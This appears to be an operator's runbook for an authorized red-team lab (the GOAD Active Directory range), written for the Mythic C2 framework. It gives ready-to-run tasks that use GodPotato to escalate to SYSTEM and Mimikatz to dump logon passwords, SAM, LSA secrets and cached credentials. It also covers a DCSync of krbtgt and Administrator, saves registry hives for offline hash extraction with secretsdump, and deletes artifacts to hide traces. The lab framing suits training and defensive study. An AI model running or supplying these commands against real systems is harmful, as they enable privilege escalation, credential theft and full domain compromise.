---
title: Mythic - Lab Operations - GodPotato and Mimikatz
category: Lab Operations
environment: GOAD
execution_context: "[MYTHIC] tasks issued to active Windows callback"
privileges: Depends on step — see each section
tags:
  - Mythic
  - GodPotato
  - Mimikatz
  - PrivEsc
  - CredentialDumping
  - GOAD
date_created: 2026-08-23
status: CORRECTED
---

# Mythic — GodPotato & Mimikatz Operations

> [!WARNING]
> This documentation is for the **authorized GOAD lab environment only**.

> [!IMPORTANT]
> Read [[GOAD - Error Audit and Contradiction Report]] before using this note.
> Several errors in the original runbooks affect commands in this section.

> [!NOTE]
> All `shell`, `execute-assembly`, `upload`, and `download` commands in this note are **Mythic task commands** issued from the Mythic UI to an active Windows agent callback.
> They are NOT Kali terminal commands.

---

## Prerequisites

- [ ] Active Mythic Apollo callback on a GOAD Windows host
- [ ] GodPotato.exe uploaded to Mythic File Host (see [[Mythic - Installation and Verification]])
- [ ] mimikatz.exe uploaded to Mythic File Host
- [ ] Callback has `SeImpersonatePrivilege` (required for GodPotato)

---

## Step 1 — Verify Privileges

```
Execution Context: [MYTHIC]
Task type: shell
Host: Active GOAD Windows callback
Privileges: Current user (unknown until confirmed)
```

Issue as Mythic tasks to the active callback:

```
shell whoami
shell whoami /all
shell whoami /priv
```

**Parse for:**

| Token | Meaning | Required For |
|---|---|---|
| `SeImpersonatePrivilege` | Can impersonate tokens | GodPotato |
| `SeAssignPrimaryTokenPrivilege` | Can assign primary token | GodPotato |
| `SeDebugPrivilege` | Can debug processes | Mimikatz direct |
| `Mandatory Label\System Mandatory Level` | Already SYSTEM | No privesc needed |
| `Mandatory Label\High Mandatory Level` | Admin token | SeDebug may be available |

**Expected by GOAD host type:**

| Host | Expected Context | SeImpersonate? |
|---|---|---|
| IIS web host (CASTELBLACK/BRAAVOS) | `iis apppool\defaultapppool` | YES |
| PrintNightmare victim | `nt authority\system` | N/A (already SYSTEM) |
| SMB guest session | `north\guest` or similar | Unlikely |
| Domain Controller | SYSTEM (after exploit) | N/A |

> [!NOTE]
> Exact hostnames depend on verified GOAD topology. See [[GOAD - IP Hostname Matrix]].

---

## Step 2 — Test GodPotato

Run this ONLY after completing Step 1 and confirming SeImpersonatePrivilege.

```
Execution Context: [MYTHIC]
Task type: execute-assembly
Host: Active GOAD Windows callback
Privileges: Service account with SeImpersonatePrivilege
Prerequisite: GodPotato.exe uploaded to Mythic File Host
```

```
execute-assembly GodPotato.exe -cmd "cmd /c whoami"
```

**Expected result:** `nt authority\system`

**If result is NOT nt authority\system:**

| Output | Meaning | Action |
|---|---|---|
| Same user as before | GodPotato did not escalate | Try alternative CLSID (see below) |
| `Access Denied` | No SeImpersonatePrivilege | Cannot use Potato — use alternative |
| Error or crash | AV or wrong .NET version | Try GodPotato-NET35 variant |

**Alternative CLSIDs if default BITS CLSID fails:**

```
execute-assembly GodPotato.exe -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "cmd /c whoami"
execute-assembly GodPotato.exe -clsid {4e14fba2-2e22-11d1-9964-00c04fbbb345} -cmd "cmd /c whoami"
execute-assembly GodPotato.exe -clsid {00020819-0000-0000-C000-000000000046} -cmd "cmd /c whoami"
```

---

## Step 3 — Credential Dumping with Mimikatz

> [!WARNING] Documentation Error Found
> **Original (existing vault notes):** Claims "No mimikatz.exe on disk. Ever." but then uses GodPotato to launch mimikatz.exe from C:\Windows\Temp\.
>
> **Reality:** When GodPotato is used as a launcher, it spawns a child process. You cannot chain two `execute-assembly` calls. Mimikatz must briefly exist on disk when using the GodPotato wrapper approach.
>
> **Corrected procedure:** The hybrid method below is correct and practical.

Run this ONLY after completing Step 2 and confirming GodPotato → SYSTEM works.

```
Execution Context: [MYTHIC]
Host: Active GOAD Windows callback
Privileges: Service account (GodPotato will escalate to SYSTEM)
Prerequisite: GodPotato.exe and mimikatz.exe uploaded to Mythic File Host
```

### Sub-step 3a — Write the Mimikatz command script (text file only, not binary)

```
shell cmd /c "echo privilege::debug > C:\Windows\Temp\m.txt && echo token::elevate >> C:\Windows\Temp\m.txt && echo token::whoami >> C:\Windows\Temp\m.txt && echo sekurlsa::logonpasswords >> C:\Windows\Temp\m.txt && echo lsadump::sam >> C:\Windows\Temp\m.txt && echo lsadump::secrets >> C:\Windows\Temp\m.txt && echo lsadump::cache >> C:\Windows\Temp\m.txt && echo sekurlsa::ekeys >> C:\Windows\Temp\m.txt && echo exit >> C:\Windows\Temp\m.txt"
```

### Sub-step 3b — Upload mimikatz.exe to disk (one binary, briefly on disk)

```
upload ~/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe
```

> [!NOTE]
> Upload path on Kali (`~/payloads/goad/`) must match where you stored mimikatz. Adjust if your home directory differs.

### Sub-step 3c — Execute via GodPotato as SYSTEM

```
execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\m.txt"
```

**Expected result:** Mimikatz output appears in the Mythic task results, including NTLM hashes and potentially plaintext passwords for GOAD accounts.

### Sub-step 3d — Download Kerberos tickets (if any were exported)

```
shell dir C:\Windows\Temp\*.kirbi
download C:\Windows\Temp\*.kirbi
```

### Sub-step 3e — Clean up disk artifacts

```
shell del /q /f C:\Windows\Temp\mimikatz.exe
shell del /q /f C:\Windows\Temp\m.txt
shell del /q /f C:\Windows\Temp\*.kirbi
```

**Verify cleanup:**
```
shell dir C:\Windows\Temp
```

---

## Step 4 — DCSync (Requires Domain Admin)

Run this ONLY after confirming Domain Admin privileges via a Domain Controller callback.

```
Execution Context: [MYTHIC]
Task type: execute-assembly
Host: Active callback on a GOAD Domain Controller
Privileges: Domain Administrator
Prerequisite: Step 3 completed, NTLM hash or password for DA obtained
```

> [!WARNING] Documentation Error Found
> **Original (GOAD Playbook Phase 05.2):** `execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:krbtgt" exit`
>
> **Problem:** Mythic's execute-assembly passes args to .NET Main() — this syntax will not behave like a shell pipeline.
>
> **Corrected approach:** Use a command script file (same as Step 3) with DCSync commands added.

Create a DCSync script file:

```
shell cmd /c "echo privilege::debug > C:\Windows\Temp\dcsync.txt && echo lsadump::dcsync /domain:sevenkingdoms.local /user:krbtgt >> C:\Windows\Temp\dcsync.txt && echo lsadump::dcsync /domain:sevenkingdoms.local /user:Administrator >> C:\Windows\Temp\dcsync.txt && echo exit >> C:\Windows\Temp\dcsync.txt"
upload ~/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe
execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\dcsync.txt"
```

> [!IMPORTANT]
> Replace `sevenkingdoms.local` with the actual domain of the DC you are operating from.
> VERIFY domain names against [[GOAD - IP Hostname Matrix]].

Clean up:
```
shell del /q /f C:\Windows\Temp\mimikatz.exe
shell del /q /f C:\Windows\Temp\dcsync.txt
```

---

## Step 5 — Registry Hive Extraction (Offline Hash Method)

Alternative to Mimikatz. Works even when LSASS is protected.

```
Execution Context: [MYTHIC]
Host: Active callback (any GOAD Windows host)
Privileges: SYSTEM (via GodPotato)
```

```
execute-assembly GodPotato.exe -cmd "reg save HKLM\SAM C:\Windows\Temp\sam.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SYSTEM C:\Windows\Temp\system.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SECURITY C:\Windows\Temp\security.hive"
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive
download C:\Windows\Temp\security.hive
shell del /q /f C:\Windows\Temp\sam.hive
shell del /q /f C:\Windows\Temp\system.hive
shell del /q /f C:\Windows\Temp\security.hive
```

Then process on Kali (AFTER download completes):

```
Execution Context: [KALI]
Shell: Bash
Privileges: Normal user
```

```bash
# Files will be in Mythic's download directory or wherever Mythic saves them
# Adjust path as needed
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

---

## Common Mistakes

- Issuing Mythic task commands (`shell`, `execute-assembly`) in a Kali terminal instead of the Mythic UI
- Skipping Step 1 (privilege check) and running GodPotato with no SeImpersonatePrivilege
- Not uploading GodPotato or Mimikatz to the Mythic File Host before execute-assembly
- Forgetting to clean up disk artifacts after credential dumping
- Running DCSync commands from a non-DC callback (requires DC with DA access)
- Using wrong domain name in DCSync — VERIFY against [[GOAD - IP Hostname Matrix]]

---

## Evidence Template

After each operation, record:

```
Host: VERIFY
Username obtained: VERIFY
NTLM hash: VERIFY
Plaintext password: VERIFY (if recovered)
krbtgt hash (if DCSync): VERIFY
Date/time: VERIFY
```

---

## Related Notes

- [[Mythic - Architecture Overview]]
- [[Mythic - Payload Generation]]
- [[GOAD - Error Audit and Contradiction Report]]
- [[GOAD - IP Hostname Matrix]]
- [[GOAD - Exploitation - Privilege Escalation]]
